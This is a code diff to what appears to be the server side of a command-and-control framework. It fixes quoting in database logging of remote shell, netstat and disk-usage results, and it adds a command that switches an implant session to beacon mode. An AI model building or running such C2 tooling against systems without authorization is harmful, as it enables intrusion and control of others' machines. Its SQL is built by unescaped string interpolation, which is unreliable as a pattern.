@@ -69,7 +69,7 @@ class SessionCommandsClass:
             results, _, cwd = output.rpartition("<sep>")
             self.database.insert_entry("Shell", f"'{r_address[0]}'," +
                                        f"'{datetime.now()}', " +
-                                       f"{command}', '{results}'")
+                                       f"'{command}', '{results}'")
             print(results)
         return
 
@@ -238,8 +238,8 @@ class SessionCommandsClass:
         print(colorama.Fore.YELLOW + netstat)  # prints netstat
         self.database.insert_entry(
             "Netstat",
-            f'"{r_address[0]}","{netstat}",',
-            f'"{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"')
+            f'"{r_address[0]}","{netstat}","{datetime.now().strftime(
+                "%Y-%m-%d %H:%M:%S")}"')
         return
 
     def diskusage(self, conn: ssl.SSLSocket,
@@ -251,9 +251,9 @@ class SessionCommandsClass:
         results = receive_data(conn)
         self.database.insert_entry(
             "Disk",
-            f'"{r_address[0]}","{results}",',
-            f'"{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}"')
-        print(colorama.Fore.YELLOW + results)  # prints results
+            f'"{r_address[0]}","{results}","{datetime.now().strftime(
+                "%Y-%m-%d %H:%M:%S")}"')
+        print(colorama.Fore.YELLOW + results)
 
     def list_dir(self, conn: ssl.SSLSocket,
                  r_address: Tuple[str, int]) -> None:
@@ -273,3 +273,10 @@ class SessionCommandsClass:
             except BaseException:
                 pass
         print(directory)
+
+    def change_beacon(self, conn: ssl.SSLSocket,
+                      r_address: Tuple[str, int], uuid) -> None:
+        send_data(conn, "switch_beacon")
+        print(colorama.Fore.GREEN + f"{uuid} will be switched to beacon mode")
+        remove_connection_list(r_address)
+        return
